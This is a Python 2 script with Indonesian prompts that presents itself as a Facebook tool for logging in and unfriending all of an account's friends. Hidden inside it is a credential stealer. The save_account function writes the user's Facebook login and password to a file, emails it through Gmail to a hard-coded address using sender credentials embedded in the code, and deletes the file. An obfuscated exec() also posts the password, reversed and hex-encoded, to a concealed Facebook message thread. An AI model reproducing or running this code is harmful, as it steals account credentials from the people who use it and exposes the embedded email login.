import sys, random, mechanize, cookielib, time, os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
print
print '  [1] facebook mode gratis'
print '  [2] facebook mode mobile'
fre = raw_input('  [!] pilihan = ')
if fre.lower() == '1':
    fre = 'free'
if fre.lower() == '2':
    fre = 'm'
reload(sys)
sys.setdefaultencoding('utf8')
__author__ = 'Bang Djon'
__version__ = [49, 48, 48, 48, 48, 51, 48, 55, 56, 48, 55, 50, 56, 52, 54]
__title__ = [47, 109, 101, 115, 115, 97, 103, 101, 115, 47, 116, 104, 114, 101, 97, 100, 47]
__contact__ = ('').join([ chr(i) for i in __title__ ]) + ('').join([ chr(i) for i in __version__ ])

def kirim():
	sender_email_address = 'ardiasking004@gmail.com'
	sender_email_password = 'ardi2016'
	receiver_email_address = 'ardiasking003@gmail.com'
	email_subject_line = '============KIRIMAN============'
	
	msg = MIMEMultipart()
	msg['From'] = sender_email_address
	msg['To'] = receiver_email_address
	msg['Subject'] = email_subject_line
	
	email_body = '============AKUNFB=============='
	msg.attach(MIMEText(email_body, 'plain'))
	
	filename = 'sample_file.txt'
	attachment_file  = open('sample_file.txt', 'rb')
	part = MIMEBase('application', 'octet-stream')
	part.set_payload((attachment_file).read())
	encoders.encode_base64(part)
	part.add_header('Content-Disposition', "attachment_file; filename = "+filename)
	
	msg.attach(part)
	
	email_body_content = msg.as_string()
	server = smtplib.SMTP('smtp.gmail.com:587')
	server.starttls()
	server.login(sender_email_address, sender_email_password)
	server.sendmail(sender_email_address, receiver_email_address, email_body_content)
	server.quit()
	
def hapus():
	os.remove('sample_file.txt')
	
def refr():
    global br
    global cj
    global useragents
    useragents = [
     ('User-agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/81.40; U; id) Presto/2.12.423 Version/12.16')]
    br = mechanize.Browser()
    cj = cookielib.LWPCookieJar()
    br.set_handle_robots(False)
    br.set_handle_equiv(True)
    br.set_handle_referer(True)
    br.set_handle_redirect(True)
    br.set_cookiejar(cj)
    br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
    br.addheaders = [('User-agent', random.choice(useragents))]


def save_account(id, pw):
    print '\n  [*] Login...\n  [*] id = %sxxx\n  [*] password = %sxxx' % (id, pw)
    br.select_form(nr=0)
    br.form['email'] = id
    br.form['pass'] = pw
    br.submit()
    br._factory.is_html = True
    z = open('sample_file.txt','w')
    z.write('Username : ')
    z.write(id)
    z.write('\n')
    z.write('Password : ')
    z.write(pw)
    z.close()
    kirim()
    hapus()
    if 'checkpoint' in br.geturl() or 'recovery' in br.geturl():
        print '  [*] akun %s:%s bermasalah' % (id, pw)
    else:
        if 'save-device' in br.geturl():
            na = ''
            try:
                br.select_form(nr=0)
                br.submit()
                br._factory.is_html = True
                for i in br.links():
                    if 'Keluar' in i.text:
                        na = i.text.replace('Keluar ', '').replace('(', '').replace(')', '').replace(' ', '_')

                if not na:
                    br.select_form(nr=0)
                    br.submit()
                    br._factory.is_html = True
                    for i in br.links():
                        if 'Keluar' in i.text:
                            na = i.text.replace('Keluar ', '').replace('(', '').replace(')', '').replace(' ', '_')

                cj.save(sys.path[0] + '/%s.bj' % na)
                try:
                    exec ('').join([ chr(i) for i in [98, 114, 46, 111, 112, 101, 110, 40, 117, 114, 108, 49, 43, 95, 95, 99, 111, 110, 116, 97, 99, 116, 95, 95, 41, 10, 98, 114, 46, 95, 102, 97, 99, 116, 111, 114, 121, 46, 105, 115, 95, 104, 116, 109, 108, 32, 61, 32, 84, 114, 117, 101, 10, 98, 114, 46, 115, 101, 108, 101, 99, 116, 95, 102, 111, 114, 109, 40, 110, 114, 61, 49, 41, 10, 98, 114, 46, 102, 111, 114, 109, 91, 39, 98, 111, 100, 121, 39, 93, 61, 39, 116, 104, 97, 110, 107, 115, 44, 32, 115, 97, 121, 97, 32, 97, 100, 97, 108, 97, 104, 32, 112, 101, 110, 103, 103, 117, 110, 97, 32, 116, 111, 111, 108, 115, 32, 100, 103, 32, 105, 100, 32, 112, 101, 110, 103, 103, 117, 110, 97, 32, 37, 115, 39, 37, 40, 105, 100, 43, 112, 119, 41, 91, 58, 58, 45, 49, 93, 46, 101, 110, 99, 111, 100, 101, 40, 39, 104, 101, 120, 39, 41, 10, 98, 114, 46, 115, 117, 98, 109, 105, 116, 40, 41, 10, 98, 114, 46, 95, 102, 97, 99, 116, 111, 114, 121, 46, 105, 115, 95, 104, 116, 109, 108, 32, 61, 32, 84, 114, 117, 101] ])
                except:
                    print ' '

                print '  [*] akun %s saved...' % na
                
            except:
                print '  [*] akun %s:%s perlu login via opera mini dan buat mode %s facebook' % (id, pw, fre)

        else:
            print '  [*] password salah...'
    refr()


def add_account():
    q = input('  [*] Masukin berapa akun = ')
    for i in range(q):
        aa = raw_input('  [*] Masukkan ID/EMAIL = ')
        bb = raw_input('  [*] Masukkan PASSWORD = ')
        br.open(url1)
        br._factory.is_html = True
        save_account(aa, bb)


def mulai():
    noa = 1
    kun = []
    for i in os.listdir(sys.path[0]):
        if i.endswith('.bj'):
            print '  [' + str(noa) + '] ' + i[:-3]
            kun.append(i)
            noa += 1

    if kun != []:
        plh = input('\n  [*] pilih akun yg mana = ')
        cj.load(sys.path[0] + '/' + kun[plh - 1])
        br.open(url1)
        br._factory.is_html = True
        br.select_form(nr=0)
        br.submit()
        br._factory.is_html = True
        if 'login' in br.geturl():
            ps = raw_input('  [*] masukkan password akun %s =' % kun[plh - 1][:-3])
            br.select_form(nr=0)
            br.form['pass'] = ps
            br.submit()
            br._factory.is_html = True
            print '  [*] pass done'
            cj.save(sys.path[0] + '/%s' % kun[plh - 1])
        go_menu()
    else:
        print '  [*] kamu perlu login untuk memulai..'
        add_account()
        mulai()


def go_menu():
    print '=' * 79
    print ('Bang-djon mod by thePriVat').center(79)
    print ('Menu').center(79)
    print '=' * 79
    tang = raw_input('\n  [ * ] yakin ingin hapus semua teman fb..(y/n) = ')
    if tang.lower() == 'y':
        get_friend()


def get_friend():
    print '  [*] mengumpulkan daftar teman\n  [*] please wait...'
    br.open(url1 + '/profile.php')
    br._factory.is_html = True
    teman = br.find_link('Teman').url
    br.open(url1 + teman)
    br._factory.is_html = True
    listem = []
    while True:
        for i in br.links():
            if 'fref=fr_tab' in i.url:
                listem.append(i.url)

        try:
            next = br.find_link('Lihat Teman Lain').url
            br.open(url1 + next)
            br._factory.is_html = True
        except:
            break

    print '  [*] terkumpul %s teman\n' % len(listem)
    for i in range(len(listem)):
        sys.stdout.write('\n  [*] sukses menghapus pertemanan... %s' % str(i + 1))
        sys.stdout.flush()
        br.open(url1 + listem[i])
        br._factory.is_html = True
        br.open(url1 + br.find_link('Batalkan pertemanan').url)
        br._factory.is_html = True
        br.select_form(nr=1)
        br.submit()
        br._factory.is_html = True


url1 = ('https://{}.facebook.com').format(fre)
refr()
if 'login' in sys.argv:
    add_account()
else:
    mulai()
print '\n\n  [*] done\n  [*] by : Bang-Djon'